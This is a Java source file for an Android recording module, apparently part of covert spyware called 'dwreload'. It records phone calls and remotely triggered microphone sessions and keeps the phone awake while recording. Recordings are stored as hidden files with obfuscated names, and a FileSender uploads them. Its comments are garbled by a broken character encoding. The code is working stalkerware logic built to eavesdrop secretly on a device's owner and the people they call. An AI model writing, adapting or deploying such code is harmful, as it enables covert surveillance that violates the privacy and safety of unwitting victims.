package com.dwreload.modules;

import java.lang.ref.WeakReference;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.LinkedList;
import java.util.Locale;

import com.dwreload.FileSender;
import com.dwreload.FileSender.FileType;
import com.dwreload.SettingsManager;
import com.dwreload.lib.FileUtil;

import android.annotation.SuppressLint;
import android.content.Context;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.Message;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;

@SuppressLint("InlinedApi")
public class RecorderModule {
	private Context mContext;
	private SettingsManager mSettings;
	private LinkedList<RecordTask> mQueue;
	private RecordTask mCurrentTask;
	private MediaRecorder mRecorder;
	private WakeLock mWakeLock;
	
	private static MyHandler sHandler;
	public static final int START_RECORD_CALL = 1;
	public static final int STOP_RECORD_CALL = 2;
	public static final int START_RECORD_REQUEST = 3;
	public static final int STOP_RECORD_REQUEST = 4;
	public static final int RESTART_RECORD_CALL = 5;
	public static final int STOP_RECORD = 6;
	
	private static final long RECORD_INTERVAL = 10 * 60 * 1000L;
	private static final long RECORD_MIN_VALUE = 10 * 1000L;
	
	public static final String CALL_PREFIX = "TRV";
	public static final String RECORD_PREFIX = "SYU";
	
	public static Boolean isRecording = false;
	
	private String filePath = null;
	
	public RecorderModule(Context context){
		mContext = context;
		mQueue = new LinkedList<RecordTask>();
		mCurrentTask = null;
		mSettings = new SettingsManager(context);
		PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
		mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DW_RECORDED_WAKELOCK");
		sHandler = new MyHandler(this);
		isRecording = false;
	}
	
	public void dispose(){
		try {
			if (mQueue != null) {
				mQueue.clear();
			}
			
			if (mCurrentTask != null) {
				stopRecord();
			}
			
			if (sHandler != null) {
				sHandler.removeMessages(STOP_RECORD_REQUEST);
			}
			
			releaseWakeLock();
			
			isRecording = false;
			
		} catch (Exception e) {
			
		} finally {
			mQueue = null;
			mCurrentTask = null;
			sHandler = null;
			mWakeLock = null;
		}
	}
	
	private void acquireWakeLock(){
		try {
			if (mWakeLock == null) {
				PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
				mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DW_RECORDED_WAKELOCK");
			}
			if (mWakeLock != null && !mWakeLock.isHeld()) {
				mWakeLock.acquire();
			}
			
		} catch (Exception e) {

		}
	}
	
	private void releaseWakeLock(){
		try {
			if (mWakeLock != null && mWakeLock.isHeld()) {
				mWakeLock.release();
			}
			
		} catch (Exception e) {

		}
	}
	
	//@SuppressWarnings("deprecation")
	private void startRecord(RecordTask task){
		if (!FileUtil.isExternalStorageAvailable() || !FileUtil.hasExternalStorageFreeMemory() || task == null){
			return;
		}
		
		acquireWakeLock();
		
		FileUtil.createNomedia(mContext);
		
		try {
			if (mRecorder == null) {
				mRecorder = new MediaRecorder();
			}
			
			int source = mSettings.recordSource();
			if (!task.isCall) {
				if (source != MediaRecorder.AudioSource.CAMCORDER && source != MediaRecorder.AudioSource.DEFAULT && source != MediaRecorder.AudioSource.MIC) {
					source = MediaRecorder.AudioSource.MIC;
				}
			}
			
			mRecorder.setAudioSource(source);
			
			String format = "";
			switch (mSettings.recordFormat()) {
			case 1:
				mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
				format = "RZPXR";//.3gp
				break;
			case 3:
				mRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
				format = "TMTYV";//.amr
				break;
			case 6:
				if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
					mRecorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);
					format = "QRZWS";//.aac
				}
				else{
					mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
					format = "RZPXR";//.3gp
				}
				
				break;
			default:
				return;
			}
			
			Date dt = new Date();
			String date = SimpleDateFormat.getDateTimeInstance(SimpleDateFormat.SHORT, SimpleDateFormat.SHORT, new Locale("ru","RU")).format(dt);
			
			
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.append(task.isCall ? CALL_PREFIX : RECORD_PREFIX);
			stringBuilder.append(".&").append(date);
			if (mSettings.NumberInName()) stringBuilder.append("-").append(task.num);
			stringBuilder.append("@#").append(format);
			String name = stringBuilder.toString();
			name = name.replace('.', '%').replace(':', '$').replace('0', 'A').replace('1', 'B').replace('2', 'C').replace('3', 'D').replace('4', 'E').replace('5', 'F')
					.replace('6', 'G').replace('7', 'H').replace('8', 'I').replace('9', 'J');
			filePath = FileUtil.getExternalFullPath(mContext, "." + name);
			mRecorder.setOutputFile(filePath);
			mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
			mRecorder.setAudioChannels(1);
			mRecorder.prepare();
			mRecorder.start();
			
			isRecording = true;
			mCurrentTask = task;
			mCurrentTask.startedAt = dt.getTime();
			
			//����� ��������� ����� �� ����� �� 10 �����
			if (task.isCall) {
				sHandler.sendEmptyMessageDelayed(RESTART_RECORD_CALL, RECORD_INTERVAL);
			}
			else{
				sHandler.sendEmptyMessageDelayed(STOP_RECORD_REQUEST, task.ms);
			}
			
		} catch (Exception e) {

			//stopRecord();
			sHandler.sendEmptyMessageDelayed(RESTART_RECORD_CALL, 5000);
		}
	}
	
	private void restartRecord(){
		sHandler.removeMessages(STOP_RECORD_REQUEST);
		sHandler.removeMessages(RESTART_RECORD_CALL);
		
		stop();
		startRecord(mCurrentTask);
	}
	
	private void stopRecord(){
		sHandler.removeMessages(STOP_RECORD_REQUEST);
		sHandler.removeMessages(RESTART_RECORD_CALL);
		
		stop();
		
		mCurrentTask = null;
		
		if (mQueue.isEmpty()) {
			release();
			if (!mSettings.DayReports()) new FileSender(mContext, FileType.RECORD).start();
		}
		else{
			startRecord(mQueue.poll());
		}
	}
	
	private void stop(){
		isRecording = false;
		
		try {
			mRecorder.stop();
			mRecorder.reset();
			
		} catch (Exception e) {
			mRecorder = null;
		}
	}
	
	private void release(){
		if (mRecorder != null) {
			try {
				mRecorder.release();
				
			} catch (Exception e) {
				
			} finally{
				mRecorder = null;
			}
		}
		
		releaseWakeLock();
	}
	
	private void pauseRecord(){
		sHandler.removeMessages(STOP_RECORD_REQUEST);
		
		stop();
		// ��������� ���������� �����: ������������ ������ - �������� �������� � ������� ������
		long remainingTime = mCurrentTask.ms - (new Date().getTime() - mCurrentTask.startedAt);
		if (remainingTime > RECORD_MIN_VALUE) {
			mCurrentTask.ms = remainingTime;
			mQueue.addFirst(mCurrentTask);
		}
		
		mCurrentTask = null;
	}
	
	private synchronized void addTask(RecordTask task){
		if (task.isCall) {
			if (mCurrentTask != null && mCurrentTask.isCall) {
				return;
			}
			
			if (mCurrentTask != null) {
				pauseRecord();
			}
			
			startRecord(task);
		}
		else{
			while(task.ms > RECORD_MIN_VALUE){
				long ms = task.ms > RECORD_INTERVAL ? RECORD_INTERVAL : task.ms;
				mQueue.add(new RecordTask(ms));
				task.ms -= ms;
			}
			
			if (mCurrentTask == null && !mQueue.isEmpty()) {
				stop();
				startRecord(mQueue.poll());
			}
		}
	}
	
	public static void message(Message msg){
		if (sHandler != null) {
			sHandler.sendMessage(msg);
		}
	}
	
	private synchronized void handleMessage(Message msg){
		switch (msg.what) {
		case START_RECORD_CALL:
			addTask(new RecordTask(msg.obj));
			break;
		case STOP_RECORD_CALL:
			if (mCurrentTask != null && mCurrentTask.isCall) {
				stopRecord();
			}
			break;
		case START_RECORD_REQUEST:
			addTask(new RecordTask(msg.arg1));
			break;
		case STOP_RECORD_REQUEST:
			if (mCurrentTask != null && !mCurrentTask.isCall) {
				stopRecord();
			}
			break;
		case RESTART_RECORD_CALL:
			if (mCurrentTask != null && mCurrentTask.isCall) {
				restartRecord();
			}
			break;
		case STOP_RECORD:
			if (mCurrentTask != null) {
				mQueue.clear();
				stopRecord();
			}
			break;
		default:
			return;
		}
	}
	
	private class RecordTask{
		public Boolean isCall;
		public String num;
		public long ms;
		public long startedAt;
		
		public RecordTask(Object num){
			this.isCall = true;
			this.num = "no number";
			if (num != null) {
				this.num = (String) num;
			}
		}
		
		public RecordTask(int seconds){
			this.isCall = false;
			this.num = "";
			this.ms = seconds * 1000L;
			if (this.ms < RECORD_MIN_VALUE) {
				this.ms = RECORD_MIN_VALUE;
			}
		}
		
		public RecordTask(long ms){
			this.isCall = false;
			this.num = "";
			this.ms = ms;
		}
	}
	
	private static class MyHandler extends Handler{
		private final WeakReference<RecorderModule> mModule;
		
		public MyHandler(RecorderModule module) {
	        mModule = new WeakReference<RecorderModule>(module);
	    }
		
		@Override
        public void handleMessage(Message msg) {
			RecorderModule module = mModule.get();
			if (module != null) {
				module.handleMessage(msg);
			}
		}
	}
}
